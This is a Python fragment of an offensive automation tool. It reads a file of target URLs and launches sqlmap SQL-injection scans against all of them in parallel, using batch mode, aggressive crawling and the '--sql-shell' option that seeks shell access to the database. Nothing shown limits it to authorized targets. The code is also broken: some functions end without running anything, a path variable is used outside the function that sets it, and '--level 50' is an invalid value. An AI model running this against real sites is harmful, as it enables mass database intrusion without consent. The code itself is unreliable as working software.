def sqli_automation_enumeration():
    """Run SQLi spider enumeration on all targets stored in .tmp.enumeration using sqlmap in parallel."""

    data = get_encrypted_data()
    SQLMAP_PATH = data.get("SQLMAP_PATH", None)

    if not SQLMAP_PATH or not os.path.exists(SQLMAP_PATH):
        logging.error("❌ SQLMAP_PATH is not set or invalid. Run set_sqlmap_path() first.")
        return

    if not os.path.exists(ENUMERATION_FILE):
        logging.error("❌ Enumeration file not found. Ensure web application enumeration has been run.")
        return

    with open(ENUMERATION_FILE, "r") as file:
        targets = file.read().splitlines()

    if not targets:
        logging.warning("⚠ No targets found in enumeration file.")
        return

    logging.info(f"🔍 Starting parallel SQLi automation for {len(targets)} targets...")


def run_sqlmap(target):
    """Execute SQLMap for a single target."""
    try:
        logging.info(f"🚀 Running sqlmap spider on: {target}")

        sqlmap_cmd = [
            "python3", SQLMAP_PATH,
            "--url", target,
            "--level", "50",
            "--crawl", "20",
            "--batch",
            "--unstable",
            "--sql-shell"
        ]

        result = subprocess.run(sqlmap_cmd, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            logging.info(f"✅ SQLi scan completed for: {target}")
        else:
            logging.error(f"❌ SQLmap failed on {target}: {result.stderr.strip()}")

    except Exception as e:
        logging.error(f"❌ Unexpected SQLmap error on {target}: {e}")

# ✅ Run SQLMap in parallel (Properly indented)
def run_bulk_sqlmap(targets):
    """Run SQLMap on multiple targets in parallel."""
    if not SQLMAP_PATH:
        logging.error("❌ SQLMAP_PATH is not set. Exiting SQLi automation.")
        return

    if not targets:
        logging.warning("⚠ No targets found. Skipping SQLi scanning.")
        return

    logging.info(f"🔍 Starting SQLi automation for {len(targets)} targets...")

    with ThreadPoolExecutor(max_workers=5) as executor:
        list(tqdm(executor.map(run_sqlmap, targets), total=len(targets), desc="SQLi Scanning", unit="target"))

def sqli_testing_automation(sqlmap_path):
    """Run SQLi spider enumeration using sqlmap on all targets stored in .tmp.enumeration."""
    if not sqlmap_path or not os.path.exists(sqlmap_path):
        logging.error("❌ SQLMAP_PATH is invalid. Ensure sqlmap is installed.")
        return

    if not os.path.exists(ENUMERATION_FILE):
        logging.error("❌ Enumeration file not found. Ensure web application enumeration has been run.")
        return

    with open(ENUMERATION_FILE, "r") as file:
        targets = [line.strip() for line in file if line.strip()]

    if not targets:
        logging.warning("⚠ No targets found in enumeration file.")
        return

    logging.info(f"🔍 Starting SQLi automation for {len(targets)} targets...")
